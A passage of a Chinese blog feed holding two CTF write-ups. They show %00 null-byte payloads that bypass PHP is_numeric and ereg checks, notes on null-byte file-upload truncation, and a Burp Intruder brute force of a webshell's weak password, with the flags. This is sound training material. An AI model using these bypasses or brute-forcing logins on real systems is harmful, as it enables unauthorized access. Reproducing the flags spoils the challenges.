    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/%E7%9F%9B%E7%9B%BE/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/矛盾/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:05:36.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="5-矛盾"><a href="#5-矛盾" class="headerlink" title="5.矛盾"></a>5.矛盾</h1><p>试题链接<a href="http://123.206.87.240:8002/get/index1.php" target="_blank" rel="noopener">http://123.206.87.240:8002/get/index1.php</a></p><p><strong>1.查看题目</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_numeric（）函数检测变量是否为数字或数字字符串</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! 为逻辑运算符</span><br></pre></td></tr></table></figure><p><strong>所以num必须是数字，接着往下看定义了 num 是数字或字符串，输出num，如果num =1则输出flag值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $num;</span><br><span class="line"><span class="keyword">if</span>($num==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>因为第一眼看到了GET函数，直接在URL地址栏中尝试</strong></p><p><strong>但是没有返回flag值</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/get/index1.php?num=1</span><br></pre></td></tr></table></figure><p><strong>继续尝试其他方式</strong></p><p><strong>使用00截断将1后的字符串截断，发现可以返回了flag值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:8002/get/index1.php？num=1%00</span></span><br><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $num;</span><br><span class="line"><span class="keyword">if</span>($num==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span>flag&#123;bugku<span class="number">-789</span>-ps-ssdf&#125;</span><br></pre></td></tr></table></figure><p><strong>又做了一个类似的题目，南邮CTF的题</strong></p><p>链接：<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a></p><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isset() — 检测变量是否设置。</span><br><span class="line">strpos() — 查找 &quot;php&quot; 在字符串中第一次出现的位置</span><br><span class="line">die() 函数输出一条消息，并退出当前脚本。</span><br><span class="line">ereg 正则表达式，指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</span><br></pre></td></tr></table></figure><p><strong>这道题和bugku的题类似</strong></p><p><strong>先定义了必须是数字，也是GET方式，说明可以在地址栏直接输入</strong></p><p><strong>大概意思是，定义了 nctf必须是数字，并检测是否为数字，?nctf=1-9并加上注释#biubiubiu则输出flag值，如果接近答案则输出“骚年，继续努力吧”，正确则输出flag值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>   还是GET传值利用00截断，得到flag值，首先尝试了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php？nctf=1%00#biubiubiu</span></span><br><span class="line"></span><br><span class="line">骚年，继续努力吧啊~ view-source:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">接近答案了，但是没有输出flag值，百度一下</span><br></pre></td></tr></table></figure><h5 id="百度发现，就是浏览器会对-的编码问题，浏览器会把-编码为空，也就没有发送出-，应为-是url编码里的特殊字符，"><a href="#百度发现，就是浏览器会对-的编码问题，浏览器会把-编码为空，也就没有发送出-，应为-是url编码里的特殊字符，" class="headerlink" title="百度发现，就是浏览器会对#的编码问题，浏览器会把#编码为空，也就没有发送出#，应为#是url编码里的特殊字符，"></a>百度发现，就是浏览器会对#的编码问题，浏览器会把#编码为空，也就没有发送出#，应为#是url编码里的特殊字符，</h5><h4 id="所以将-转化为url编码为-23，在火狐插件中有转换工具"><a href="#所以将-转化为url编码为-23，在火狐插件中有转换工具" class="headerlink" title="所以将#转化为url编码为%23，在火狐插件中有转换工具"></a>所以将#转化为url编码为%23，在火狐插件中有转换工具</h4><h4 id="HEX-Encoding-–-gt-23"><a href="#HEX-Encoding-–-gt-23" class="headerlink" title="HEX Encoding #–&gt;23"></a>HEX Encoding #–&gt;23</h4><p> <strong>将转换之后的#写到url中</strong></p><p><strong>这里添加一个%号，意思为注明字符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nctf=<span class="number">1</span>%<span class="number">00</span>%<span class="number">23</span>biubiubiu</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu</span></span><br><span class="line"></span><br><span class="line">Flag: flag:nctf&#123;use_00_to_jieduan&#125;</span><br></pre></td></tr></table></figure><p><strong>直接得到flag值</strong></p><p><strong>相关知识：</strong></p><h1 id="关于00截断"><a href="#关于00截断" class="headerlink" title="关于00截断"></a>关于00截断</h1><p><strong>做了一下午的00截断的习题，总结了几点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.起到截断作用，第一题因为is_numeric（）函数遇到%00截断的漏洞</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.第二题因为ereg也遇到了0x00漏洞 （不太算%00截断漏洞）</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">3.文件上传的0x00漏洞：0x00截断原理，具体原理是 系统在对文件名的读取时，如果遇到0x00，就会认为读取已      结束。 总之就是利用ascii码为零这个特殊字符，让系统认为字符串已经结束。 </span><br><span class="line">   </span><br><span class="line">   例如一个字符串为 1.ph p a--------- 16进制为0x20  ascii为 20</span><br><span class="line">   改为00</span><br><span class="line">   发生变化</span><br><span class="line">                   1.ph pa---------- 16进制为0x00  ascii为 00</span><br><span class="line">   可以看出变化</span><br><span class="line">   ascii码为零个特殊字符，让系统认为字符串已经结束。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.就是将后面的字符截断，以为已经结束</span><br></pre></td></tr></table></figure><h1 id="关于-00截断上传漏洞-php-版本"><a href="#关于-00截断上传漏洞-php-版本" class="headerlink" title="关于%00截断上传漏洞 php 版本"></a>关于%00截断上传漏洞 php 版本</h1><p><strong>需满足 php 版本&lt;5.3.4 才有可能存在此漏洞 </strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;5-矛盾&quot;&gt;&lt;a href=&quot;#5-矛盾&quot; class=&quot;headerlink&quot; title=&quot;5.矛盾&quot;&gt;&lt;/a&gt;5.矛盾&lt;/h1&gt;&lt;p&gt;试题链接&lt;a href=&quot;http://123.206.87.240:8002/get/index1.php&quot; target
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>网站被黑</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/网站被黑/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:06:54.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p>链接：<a href="http://123.206.87.240:8002/webshell/" target="_blank" rel="noopener">http://123.206.87.240:8002/webshell/</a> </p><p>进入题目提示网页被黑</p><h4 id="一般是有后门漏洞，使用御剑进行扫描"><a href="#一般是有后门漏洞，使用御剑进行扫描" class="headerlink" title="一般是有后门漏洞，使用御剑进行扫描"></a>一般是有后门漏洞，使用御剑进行扫描</h4><p><strong>扫描出两个网址，这个网址是一个管理员的登录地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/webshell//shell.php</span><br></pre></td></tr></table></figure><p><strong>这个是index.php文件页面，黑页</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/webshell//index.php</span><br></pre></td></tr></table></figure><p><strong>方法思路：</strong></p><p><strong>1.既然扫出了管理后台，那么说明管理后台存在弱口令</strong></p><p><strong>2.利用Burp进行暴库</strong></p><p><strong>3.在管理地址随便输入进行抓包，给Intruder进行暴库</strong></p><p><strong>4.设置好Payloads，将字典写入，进行暴库即可，开始在右上角</strong></p><p><strong>5.跑完之后点一下Length查看不同长度的密码，就是跑出来的密码，没有的话添加hack到字典</strong></p><h4 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h4><p><strong>WebShell</strong></p><p><strong>PASS:hack</strong></p><p><strong>flag{hack_bug_ku035}</strong>                     </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;网站被黑&quot;&gt;&lt;a href=&quot;#网站被黑&quot; class=&quot;headerlink&quot; title=&quot;网站被黑&quot;&gt;&lt;/a&gt;网站被黑&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&quot;http://123.206.87.240:8002/webshell/&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
